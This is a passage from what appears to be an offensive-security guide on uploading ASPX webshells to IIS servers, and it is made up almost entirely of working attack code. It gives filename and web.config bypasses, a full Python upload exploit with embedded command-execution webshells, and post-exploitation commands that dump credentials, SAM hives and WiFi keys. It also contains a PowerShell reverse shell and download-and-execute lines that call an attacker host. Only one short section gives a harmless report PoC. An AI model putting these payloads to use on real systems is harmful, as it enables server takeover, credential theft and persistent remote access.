  # ── Windows generates 8.3 short filenames automatically ──
  # shell.aspx → SHELL~1.ASP (auto-generated short name)
  # Some validations check long name but IIS serves via short name

  # Discover short filenames via IIS tilde enumeration
  # Tool: https://github.com/irsdl/IIS-ShortName-Scanner

  # Manual tilde enumeration
  for char in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
        "https://target.com/uploads/${char}*~1*/.aspx" 2>/dev/null)
      [ "$STATUS" != "404" ] && echo "[*] Short name starts with: ${char}"
  done

  # Access uploaded shell via short filename
  curl -s "https://target.com/uploads/SHELL~1.ASP"
  curl -s "https://target.com/uploads/SHELL~1.ASP?cmd=whoami"

  # Common short filename patterns
  for short_name in "SHELL~1.ASP" "SHELL~1.ASPX" "CMD~1.ASPX" "WEBSH~1.ASP" "UPLOA~1.ASP"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/uploads/${short_name}" 2>/dev/null)
      [ "$STATUS" != "404" ] && echo "[+] Accessible: ${short_name} (${STATUS})"
  done
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Extension Case Variations"}
  ```bash
  # ── NTFS is case-insensitive — .ASPX = .aspx = .Aspx ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  SHELL='<%@ Page Language="C#" %><%Response.Write("CASE_BYPASS");%>'

  echo "$SHELL" > /tmp/case_test.txt

  # Generate all case permutations
  python3 -c "
  from itertools import product
  for ext in ['aspx','ashx','asmx','asp','asa','cer','cshtml']:
      for combo in product(*[(c.lower(),c.upper()) if c.isalpha() else (c,) for c in ext]):
          print(''.join(combo))
  " | head -200 | while read ext; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/case_test.txt;filename=shell.${ext}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: .${ext}"
  done

  rm -f /tmp/case_test.txt
  ```
  :::

  :::accordion-item{icon="i-lucide-shield-off" label="Trailing Characters & Double Extensions"}
  ```bash
  # ── Windows strips trailing dots and spaces from filenames ──
  # shell.aspx. → saved as shell.aspx
  # shell.aspx%20 → saved as shell.aspx

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"
  SHELL='<%@ Page Language="C#" %><%Response.Write("TRAIL_BYPASS");%>'

  echo "$SHELL" > /tmp/trail_test.txt

  for name in \
      "shell.aspx." "shell.aspx.." "shell.aspx..." \
      "shell.aspx%20" "shell.aspx%20%20" \
      "shell.aspx " "shell.aspx  " \
      "shell.aspx%00" "shell.aspx%00.jpg" \
      "shell.aspx%0a" "shell.aspx%0d" \
      "shell.aspx%09" \
      "shell.aspx.jpg" "shell.jpg.aspx" \
      "shell.aspx.jpg.aspx" "shell.txt.aspx" \
      "shell.aspx.config" "shell.config.aspx" \
      "shell.aspx;.jpg" "shell.aspx/.jpg" \
      "shell.aspx%2f.jpg" \
      "shell.aspx........." "shell.aspx.     ."; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/trail_test.txt;filename=${name}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: ${name}"
  done

  rm -f /tmp/trail_test.txt
  ```
  :::
::

### web.config Upload Abuse

::note
`web.config` is IIS's per-directory configuration file (equivalent to Apache's `.htaccess`). Uploading a `web.config` can override handler mappings, enable execution of arbitrary extensions, and even execute code directly.
::

::tabs
  :::tabs-item{icon="i-lucide-file-cog" label="Handler Mapping Override"}
  ```bash
  # ═══════════════════════════════════════
  # web.config — Map image extensions to ASP.NET handler
  # Two-stage: upload web.config + upload shell with image extension
  # ═══════════════════════════════════════

  # ── Make .jpg files execute as ASPX ──
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="aspx_handler" path="*.jpg" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" requireAccess="Write"
             preCondition="integratedMode" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  EOF

  # Upload web.config
  curl -X POST "https://target.com/api/upload" \
    -F "file=@web.config;filename=web.config;type=text/xml" \
    -H "Cookie: session=TOKEN"

  # Upload ASPX shell as .jpg
  echo '<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}).StandardOutput.ReadToEnd());%>' > shell.jpg

  curl -X POST "https://target.com/api/upload" \
    -F "file=@shell.jpg;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  # Execute
  curl -s "https://target.com/uploads/shell.jpg?cmd=whoami"

  # ── Map ALL extensions to ASPX handler ──
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="catch_all" path="*" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
      </handlers>
    </system.webServer>
  </configuration>
  EOF

  # ── Map to Classic ASP handler ──
  cat > web.config << 'EOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="asp_jpg" path="*.jpg" verb="*"
             modules="IsapiModule"
             scriptProcessor="%windir%\system32\inetsrv\asp.dll"
             resourceType="Unspecified" />
      </handlers>
    </system.webServer>
  </configuration>
  EOF
  ```
  :::

  :::tabs-item{icon="i-lucide-file-cog" label="Direct Code Execution via web.config"}
  ```bash
  # ═══════════════════════════════════════
  # web.config — Execute code directly (single file RCE)
  # No second file upload needed!
  # ═══════════════════════════════════════

  # ── Method 1: ISAPI DLL mapping with inline ASP ──
  cat > web.config << 'WCEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="web_config" path="*.config" verb="*"
             modules="IsapiModule"
             scriptProcessor="%windir%\system32\inetsrv\asp.dll"
             resourceType="Unspecified" requireAccess="Write"
             preCondition="bitness64" />
      </handlers>
      <security>
        <requestFiltering>
          <fileExtensions>
            <remove fileExtension=".config" />
          </fileExtensions>
          <hiddenSegments>
            <remove segment="web.config" />
          </hiddenSegments>
        </requestFiltering>
      </security>
    </system.webServer>
  </configuration>
  <!-- ASP code that executes when web.config is requested directly -->
  <%
  Response.Write("web.config RCE: " & CreateObject("WScript.Shell").Exec("cmd /c " & Request("cmd")).StdOut.ReadAll())
  %>
  WCEOF

  # Upload and execute
  curl -X POST "https://target.com/api/upload" \
    -F "file=@web.config;filename=web.config" \
    -H "Cookie: session=TOKEN"

  curl -s "https://target.com/uploads/web.config?cmd=whoami"

  # ── Method 2: Custom httpHandler in web.config ──
  cat > web.config << 'WCEOF'
  <?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.web>
      <httpHandlers>
        <add path="*.jpg" verb="*"
             type="System.Web.UI.PageHandlerFactory" />
      </httpHandlers>
      <compilation debug="true" />
    </system.web>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="jpg_aspx" path="*.jpg" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
        <add name="png_aspx" path="*.png" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
        <add name="gif_aspx" path="*.gif" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
        <add name="txt_aspx" path="*.txt" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
      </handlers>
      <validation validateIntegratedModeConfiguration="false" />
    </system.webServer>
  </configuration>
  WCEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-file-cog" label="web.config Upload Bypasses"}
  ```bash
  # ── Bypass filters blocking web.config upload ──

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  WEB_CONFIG='<?xml version="1.0"?><configuration><system.webServer><handlers><add name="x" path="*.jpg" verb="*" type="System.Web.UI.PageHandlerFactory"/></handlers></system.webServer></configuration>'

  echo "$WEB_CONFIG" > /tmp/wc_test

  # Filename variations
  for name in \
      "web.config" "Web.config" "WEB.CONFIG" "Web.Config" \
      "web.config." "web.config%20" "web.config%00" \
      "web.config:::\$DATA" \
      "WEB~1.CON" \
      ".config" "web.config.txt" "web.config.bak"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/wc_test;filename=${name}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED: ${name}"
  done

  # Content-Type variations
  for ct in "text/xml" "application/xml" "text/plain" "application/octet-stream" \
            "image/jpeg" "application/json"; do
      STATUS=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$UPLOAD_URL" \
        -F "file=@/tmp/wc_test;filename=web.config;type=${ct}" \
        -H "Cookie: $COOKIE" 2>/dev/null)
      [ "$STATUS" = "200" ] && echo "[+] ACCEPTED with CT: ${ct}"
  done

  rm -f /tmp/wc_test
  ```
  :::
::

---

## Delivery & Exploitation Workflow

### Upload & Verification

::tabs
  :::tabs-item{icon="i-lucide-upload" label="cURL Upload Methods"}
  ```bash
  # ═══════════════════════════════════════
  # Upload ASPX shells via various methods
  # ═══════════════════════════════════════

  UPLOAD_URL="https://target.com/api/upload"
  COOKIE="session=TOKEN"

  # ── Standard multipart upload ──
  curl -X POST "$UPLOAD_URL" \
    -F "file=@shell_cmd.aspx;filename=shell.aspx" \
    -H "Cookie: $COOKIE" -v

  # ── With spoofed Content-Type ──
  curl -X POST "$UPLOAD_URL" \
    -F "file=@shell_cmd.aspx;filename=shell.aspx;type=image/jpeg" \
    -H "Cookie: $COOKIE"

  # ── PUT method (WebDAV) ──
  curl -X PUT "https://target.com/uploads/shell.aspx" \
    --data-binary @shell_cmd.aspx \
    -H "Content-Type: text/plain" \
    -H "Cookie: $COOKIE"

  # ── WebDAV MOVE method ──
  # Upload as .txt then MOVE to .aspx
  curl -X PUT "https://target.com/uploads/shell.txt" \
    --data-binary @shell_cmd.aspx \
    -H "Cookie: $COOKIE"

  curl -X MOVE "https://target.com/uploads/shell.txt" \
    -H "Destination: https://target.com/uploads/shell.aspx" \
    -H "Cookie: $COOKIE"

  # ── Base64 in JSON body ──
  BASE64_SHELL=$(base64 -w0 shell_cmd.aspx)
  curl -X POST "$UPLOAD_URL" \
    -H "Content-Type: application/json" \
    -H "Cookie: $COOKIE" \
    -d "{\"fileName\":\"shell.aspx\",\"content\":\"${BASE64_SHELL}\"}"

  # ── With Anti-CSRF token (ASP.NET) ──
  # First, get the page with the upload form to extract tokens
  FORM_PAGE=$(curl -s -c /tmp/cookies.txt "https://target.com/upload" -H "Cookie: $COOKIE")
  VIEWSTATE=$(echo "$FORM_PAGE" | grep -oP '__VIEWSTATE.*?value="[^"]*"' | grep -oP 'value="[^"]*"' | tr -d '"' | sed 's/value=//')
  EVENTVALIDATION=$(echo "$FORM_PAGE" | grep -oP '__EVENTVALIDATION.*?value="[^"]*"' | grep -oP 'value="[^"]*"' | tr -d '"' | sed 's/value=//')
  REQUEST_VERIFICATION=$(echo "$FORM_PAGE" | grep -oP '__RequestVerificationToken.*?value="[^"]*"' | grep -oP 'value="[^"]*"' | tr -d '"' | sed 's/value=//')

  curl -X POST "$UPLOAD_URL" \
    -F "file=@shell_cmd.aspx;filename=shell.aspx" \
    -F "__VIEWSTATE=$VIEWSTATE" \
    -F "__EVENTVALIDATION=$EVENTVALIDATION" \
    -F "__RequestVerificationToken=$REQUEST_VERIFICATION" \
    -b /tmp/cookies.txt \
    -H "Cookie: $COOKIE"
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Python Exploit Script"}
  ```python [aspx_upload_exploit.py]
  #!/usr/bin/env python3
  """
  ASPX Webshell Upload Exploit
  Handles ASP.NET anti-forgery tokens, ViewState, and IIS-specific bypasses
  """
  import requests
  import re
  import sys
  import time
  import urllib3
  urllib3.disable_warnings()

  class ASPXUploadExploit:
      SHELLS = {
          'cmd': '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">protected void Page_Load(object s,EventArgs e){string c=Request["cmd"];if(c!=null){var p=new ProcessStartInfo("cmd.exe","/c "+c){RedirectStandardOutput=true,UseShellExecute=false,CreateNoWindow=true};var r=Process.Start(p);Response.Write("<pre>"+Server.HtmlEncode(r.StandardOutput.ReadToEnd())+"</pre>");r.WaitForExit();}}</script>',
          'minimal': '<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process(){StartInfo=new System.Diagnostics.ProcessStartInfo("cmd.exe","/c "+Request["cmd"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>',
          'asp_classic': '<%eval request("cmd")%>',
          'poc': '<%@ Page Language="C#" %><% Response.Write("ASPX_UPLOAD_POC_" + Environment.MachineName); %>',
      }

      IIS_EXTENSIONS = [
          '.aspx', '.ASPX', '.aSpX', '.Aspx', '.aSPX',
          '.ashx', '.ASHX', '.aShX',
          '.asmx', '.ASMX',
          '.asp', '.ASP', '.aSp', '.Asp',
          '.asa', '.ASA',
          '.cer', '.CER', '.Cer',
          '.cshtml', '.CSHTML',
          '.config',
      ]

      IIS_BYPASSES = [
          '{ext}', '{ext}.', '{ext}..', '{ext}%20', '{ext}%00',
          '{ext}::$DATA', '{ext};.jpg', '{ext};.png',
          '{ext}.jpg', 'shell.jpg{ext}',
      ]

      def __init__(self, upload_url, field="file", cookies=None):
          self.upload_url = upload_url
          self.field = field
          self.session = requests.Session()
          self.session.verify = False
          if cookies:
              self.session.cookies.update(cookies)
          self.base_url = upload_url.rsplit('/', 2)[0]

      def extract_aspnet_tokens(self, form_url):
          """Extract ASP.NET ViewState and anti-forgery tokens"""
          try:
              r = self.session.get(form_url, timeout=10)
              tokens = {}
              for token_name in ['__VIEWSTATE', '__VIEWSTATEGENERATOR',
                                  '__EVENTVALIDATION', '__RequestVerificationToken']:
                  match = re.search(
                      rf'name="{token_name}".*?value="([^"]*)"', r.text, re.DOTALL)
                  if match:
                      tokens[token_name] = match.group(1)
              return tokens
          except:
              return {}

      def upload(self, content, filename, content_type="application/octet-stream", extra_fields=None):
          """Upload file with optional ASP.NET tokens"""
          files = {self.field: (filename, content.encode() if isinstance(content, str) else content, content_type)}
          data = extra_fields or {}
          try:
              r = self.session.post(self.upload_url, files=files, data=data, timeout=30)
              return r.status_code, r.text
          except Exception as e:
              return 0, str(e)

      def verify_shell(self, filename, upload_dirs=None):
          """Check if shell is accessible and executable"""
          if upload_dirs is None:
              upload_dirs = ['', 'uploads/', 'Upload/', 'Files/', 'Content/',
                            'Media/', 'images/', 'Uploads/', 'App_Data/']

          for d in upload_dirs:
              url = f"{self.base_url}/{d}{filename}"
              try:
                  r = self.session.get(url, params={'cmd': 'echo ASPX_RCE_CONFIRMED'}, timeout=10)
                  if 'ASPX_RCE_CONFIRMED' in r.text:
                      return url, True
                  if 'ASPX_UPLOAD_POC' in r.text:
                      return url, True
                  # Check for ASP.NET compilation error (means it tried to execute)
                  if 'Compilation Error' in r.text or 'Server Error' in r.text:
                      return url, False  # Exists but has code error
              except:
                  continue
          return None, False

      def spray(self, shell_type='cmd', delay=0.3):
          """Test all extension and bypass combinations"""
          shell = self.SHELLS.get(shell_type, self.SHELLS['cmd'])

          print(f"[*] Target: {self.upload_url}")
          print(f"[*] Shell type: {shell_type}")
          print(f"[*] Testing {len(self.IIS_EXTENSIONS)} extensions × {len(self.IIS_BYPASSES)} bypasses")
          print("-" * 60)

          for ext in self.IIS_EXTENSIONS:
              for bypass_template in self.IIS_BYPASSES:
                  filename = "shell" + bypass_template.replace('{ext}', ext)

                  for ct in ['image/jpeg', 'application/octet-stream', 'text/plain']:
                      status, resp = self.upload(shell, filename, ct)

                      if status in [200, 201]:
                          success = any(w in resp.lower() for w in
                              ['success', 'upload', 'saved', 'url', 'path', 'file'])
                          if success:
                              print(f"[+] ACCEPTED: {filename} (CT: {ct})")

                              # Verify execution
                              time.sleep(0.5)
                              url, executed = self.verify_shell(filename)
                              if url and executed:
                                  print(f"    [!!!] RCE CONFIRMED: {url}")
                                  return url
                              elif url:
                                  print(f"    [~] Exists: {url} (check manually)")

                              break

                  time.sleep(delay)

          # Try web.config attack
          print("\n[*] Trying web.config handler override...")
          web_config = '''<?xml version="1.0" encoding="UTF-8"?>
  <configuration>
    <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
        <add name="aspx_jpg" path="*.jpg" verb="*"
             type="System.Web.UI.PageHandlerFactory"
             resourceType="Unspecified" />
      </handlers>
    </system.webServer>
  </configuration>'''

          status, resp = self.upload(web_config, "web.config", "text/xml")
          if status in [200, 201]:
              print("[+] web.config uploaded!")
              # Now upload shell as .jpg
              status2, resp2 = self.upload(shell, "shell.jpg", "image/jpeg")
              if status2 in [200, 201]:
                  time.sleep(1)
                  url, executed = self.verify_shell("shell.jpg")
                  if url and executed:
                      print(f"[!!!] web.config + shell.jpg RCE: {url}")
                      return url

          print("\n[-] No successful exploitation path found")
          return None

  if __name__ == "__main__":
      exploit = ASPXUploadExploit(
          upload_url="https://target.com/api/upload",
          field="file",
          cookies={"session": "AUTH_TOKEN"},
      )
      result = exploit.spray('cmd')
      if result:
          print(f"\n[*] Interactive: curl '{result}?cmd=COMMAND'")
  ```
  :::

  :::tabs-item{icon="i-lucide-upload" label="Verification Commands"}
  ```bash
  # ═══════════════════════════════════════
  # Verify uploaded ASPX shell execution
  # ═══════════════════════════════════════

  SHELL_URL="https://target.com/uploads/shell.aspx"

  # Basic verification
  curl -s "${SHELL_URL}?cmd=whoami"
  curl -s "${SHELL_URL}?cmd=hostname"
  curl -s "${SHELL_URL}?cmd=ipconfig"

  # System information
  curl -s "${SHELL_URL}?cmd=systeminfo"
  curl -s "${SHELL_URL}" --data-urlencode "cmd=whoami /all"
  curl -s "${SHELL_URL}" --data-urlencode "cmd=net user"
  curl -s "${SHELL_URL}" --data-urlencode "cmd=net localgroup administrators"

  # Check common upload directories
  for dir in uploads Upload Files Content Media images Uploads App_Data temp; do
      for file in shell.aspx shell.asp cmd.aspx cmd.asp shell.ashx; do
          URL="https://target.com/${dir}/${file}"
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" "${URL}?cmd=echo+FOUND" 2>/dev/null)
          if [ "$STATUS" = "200" ]; then
              RESULT=$(curl -s "${URL}?cmd=echo+ASPX_SHELL_FOUND")
              echo "$RESULT" | grep -q "ASPX_SHELL_FOUND" && echo "[+] SHELL: ${URL}"
          fi
      done
  done

  # OOB verification (if direct access blocked)
  curl -s "${SHELL_URL}" --data-urlencode \
    "cmd=powershell -c \"Invoke-WebRequest -Uri http://ATTACKER_IP:8080/aspx_confirmed\""
  # Check attacker HTTP server for callback

  # DNS callback
  curl -s "${SHELL_URL}" --data-urlencode \
    "cmd=nslookup aspx-rce.BURP_COLLAB_ID.oastify.com"
  ```
  :::
::

---

## Post-Exploitation

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Windows Enumeration"}
  ```bash
  SHELL="https://target.com/uploads/shell.aspx"

  # ── System Information ──
  curl -s "$SHELL" --data-urlencode "cmd=systeminfo"
  curl -s "$SHELL" --data-urlencode "cmd=whoami /all"
  curl -s "$SHELL" --data-urlencode "cmd=hostname"
  curl -s "$SHELL" --data-urlencode "cmd=ipconfig /all"

  # ── Users & Groups ──
  curl -s "$SHELL" --data-urlencode "cmd=net user"
  curl -s "$SHELL" --data-urlencode "cmd=net localgroup administrators"
  curl -s "$SHELL" --data-urlencode "cmd=net user administrator"
  curl -s "$SHELL" --data-urlencode "cmd=qwinsta"

  # ── Domain Information ──
  curl -s "$SHELL" --data-urlencode "cmd=net user /domain"
  curl -s "$SHELL" --data-urlencode "cmd=net group \"Domain Admins\" /domain"
  curl -s "$SHELL" --data-urlencode "cmd=nltest /dclist:"
  curl -s "$SHELL" --data-urlencode "cmd=systeminfo | findstr Domain"

  # ── Network ──
  curl -s "$SHELL" --data-urlencode "cmd=netstat -ano"
  curl -s "$SHELL" --data-urlencode "cmd=arp -a"
  curl -s "$SHELL" --data-urlencode "cmd=route print"
  curl -s "$SHELL" --data-urlencode "cmd=netsh firewall show state"

  # ── Installed Software ──
  curl -s "$SHELL" --data-urlencode "cmd=wmic product get name,version"
  curl -s "$SHELL" --data-urlencode "cmd=reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall /s | findstr DisplayName"

  # ── Scheduled Tasks ──
  curl -s "$SHELL" --data-urlencode "cmd=schtasks /query /fo LIST /v"

  # ── Services ──
  curl -s "$SHELL" --data-urlencode "cmd=sc query state=all"
  curl -s "$SHELL" --data-urlencode "cmd=wmic service get name,startname,pathname"

  # ── Credentials in web.config ──
  curl -s "$SHELL" --data-urlencode "cmd=type C:\\inetpub\\wwwroot\\web.config"
  curl -s "$SHELL" --data-urlencode "cmd=dir /s /b C:\\inetpub\\*.config"
  curl -s "$SHELL" --data-urlencode "cmd=findstr /si password *.config *.xml *.json *.ini *.txt"

  # ── IIS Configuration ──
  curl -s "$SHELL" --data-urlencode "cmd=type C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config"
  curl -s "$SHELL" --data-urlencode "cmd=%systemroot%\\system32\\inetsrv\\appcmd list site"
  curl -s "$SHELL" --data-urlencode "cmd=%systemroot%\\system32\\inetsrv\\appcmd list apppool"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Credential Extraction"}
  ```bash
  SHELL="https://target.com/uploads/shell.aspx"

  # ── Connection strings from web.config ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=powershell -c \"Get-ChildItem -Path C:\\inetpub -Recurse -Include web.config | ForEach-Object { Select-String -Path \$_.FullName -Pattern 'connectionString|password|pwd|secret|key' }\""

  # ── Machine Key (for ViewState deserialization) ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=powershell -c \"Select-String -Path C:\\inetpub\\wwwroot\\web.config -Pattern 'machineKey'\""

  # ── IIS application pool credentials ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=%systemroot%\\system32\\inetsrv\\appcmd list apppool /text:*"

  # ── Windows Credential Manager ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=cmdkey /list"

  # ── Registry stored credentials ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i password"
  curl -s "$SHELL" --data-urlencode \
    "cmd=reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" 2>nul"

  # ── WiFi passwords ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=netsh wlan show profiles"
  curl -s "$SHELL" --data-urlencode \
    "cmd=netsh wlan show profile name=\"WiFiName\" key=clear"

  # ── SAM dump (requires SYSTEM) ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=reg save HKLM\\SAM C:\\Windows\\Temp\\sam.bak"
  curl -s "$SHELL" --data-urlencode \
    "cmd=reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.bak"

  # ── Cached credentials ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=reg query \"HKLM\\SECURITY\\Cache\" 2>nul"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Reverse Shell Upgrade"}
  ```bash
  SHELL="https://target.com/uploads/shell.aspx"
  ATTACKER_IP="10.10.14.1"
  ATTACKER_PORT="4444"

  # ── Start listener ──
  # On attacker: nc -lvnp 4444
  # Or: rlwrap nc -lvnp 4444

  # ── PowerShell reverse shell ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"\$client = New-Object System.Net.Sockets.TCPClient('${ATTACKER_IP}',${ATTACKER_PORT});\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> ';\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()\""

  # ── PowerShell download & execute ──
  # Host reverse shell script on attacker
  # python3 -m http.server 8080
  curl -s "$SHELL" --data-urlencode \
    "cmd=powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://${ATTACKER_IP}:8080/rev.ps1')\""

  # ── Nishang reverse shell ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://${ATTACKER_IP}:8080/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress ${ATTACKER_IP} -Port ${ATTACKER_PORT}\""

  # ── Certutil download + execute ──
  curl -s "$SHELL" --data-urlencode \
    "cmd=certutil -urlcache -split -f http://${ATTACKER_IP}:8080/nc.exe C:\\Windows\\Temp\\nc.exe && C:\\Windows\\Temp\\nc.exe ${ATTACKER_IP} ${ATTACKER_PORT} -e cmd.exe"

  # ── Msfvenom ASPX payload (for Meterpreter) ──
  # On attacker:
  # msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.1 LPORT=4444 -f aspx > meterpreter.aspx
  # Upload meterpreter.aspx then browse to it
  ```
  :::

  :::tabs-item{icon="i-lucide-shield" label="Safe PoC for Reports"}
  ```bash
  # ── Non-destructive impact demonstration ──

  TIMESTAMP=$(date +%s)

  # Create harmless PoC (no command execution)
  cat > poc.aspx << POCEOF
  <%@ Page Language="C#" %>
  <script runat="server">
  protected void Page_Load(object sender, EventArgs e)
  {
      Response.Write("ASPX_UPLOAD_POC_${TIMESTAMP}\\n");
      Response.Write("Server: " + Environment.MachineName + "\\n");
      Response.Write("User: " + Environment.UserName + "\\n");
      Response.Write("Domain: " + Environment.UserDomainName + "\\n");
      Response.Write("OS: " + Environment.OSVersion + "\\n");
      Response.Write(".NET: " + Environment.Version + "\\n");
      Response.Write("Path: " + Server.MapPath("~/") + "\\n");
      Response.Write("Time: " + DateTime.Now + "\\n");
  }
  </script>
  POCEOF

  # Upload
  curl -X POST "https://target.com/api/upload" \
    -F "file=@poc.aspx;filename=poc_${TIMESTAMP}.aspx;type=image/jpeg" \
    -H "Cookie: session=TOKEN"

  # Verify
  curl -s "https://target.com/uploads/poc_${TIMESTAMP}.aspx"

  echo ""
  echo "═══ Report Template ═══"
  echo "Title: Remote Code Execution via ASPX Webshell Upload"
  echo "Severity: Critical (CVSS 9.8)"
  echo "Endpoint: POST /api/upload"
  echo "Impact: Arbitrary code execution as IIS application pool identity"
  echo "PoC ID: ${TIMESTAMP}"

  rm -f poc.aspx
  ```
  :::
::

---

## Tool Integration

::tabs
  :::tabs-item{icon="i-lucide-wrench" label="Nmap & IIS Enumeration"}
  ```bash
  # ── Nmap IIS scripts ──
  nmap -sV -sC -p 80,443,8080,8443 target.com --script=http-iis-*
  nmap -p 80,443 --script http-webdav-scan target.com
  nmap -p 80,443 --script http-iis-short-name-brute target.com

  # ── IIS ShortName Scanner ──
  # https://github.com/irsdl/IIS-ShortName-Scanner
  java -jar IIS_shortname_scanner.jar https://target.com/uploads/

  # ── Davtest (WebDAV testing) ──
  davtest -url https://target.com/uploads/
  # Tests PUT/MOVE/DELETE on WebDAV-enabled directories

  # ── Cadaver (WebDAV client) ──
  cadaver https://target.com/uploads/
  # Interactive WebDAV shell: put, get, move, delete
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="Metasploit Modules"}
  ```bash
  # ── Metasploit for ASPX upload exploitation ──

  # Generate ASPX Meterpreter payload
  msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=10.10.14.1 LPORT=4444 \
    -f aspx -o meterpreter.aspx

  # Generate ASPX reverse shell (no Meterpreter)
  msfvenom -p windows/x64/shell_reverse_tcp \
    LHOST=10.10.14.1 LPORT=4444 \
    -f aspx -o revshell.aspx

  # Generate ASP Classic payload
  msfvenom -p windows/shell_reverse_tcp \
    LHOST=10.10.14.1 LPORT=4444 \
    -f asp -o revshell.asp

  # IIS upload exploit modules
  msfconsole << 'MSFEOF'
  use exploit/windows/iis/iis_webdav_upload_asp
  set RHOSTS target.com
  set RPORT 443
  set SSL true
  set PATH /uploads/
  run

  # Telerik UI upload exploit
  use exploit/windows/http/telerik_ui_for_aspnet_ajax_dialogue_handler
  set RHOSTS target.com
  set RPORT 443
  set SSL true
  run
  MSFEOF
  ```
  :::

  :::tabs-item{icon="i-lucide-wrench" label="Nuclei Templates"}
  ```yaml [aspx-upload-scan.yaml]
  id: aspx-upload-detection

  info:
    name: ASPX Upload Endpoint Detection
    author: bughunter
    severity: info
    tags: iis,aspx,upload,file-upload

  http:
    - method: GET
      path:
        - "{{BaseURL}}/upload.aspx"
        - "{{BaseURL}}/fileupload.aspx"
        - "{{BaseURL}}/Upload/Upload.aspx"
        - "{{BaseURL}}/admin/upload.aspx"
        - "{{BaseURL}}/FileHandler.ashx"
        - "{{BaseURL}}/UploadHandler.ashx"
        - "{{BaseURL}}/api/upload"
        - "{{BaseURL}}/api/File/Upload"
        - "{{BaseURL}}/Telerik.Web.UI.DialogHandler.aspx"
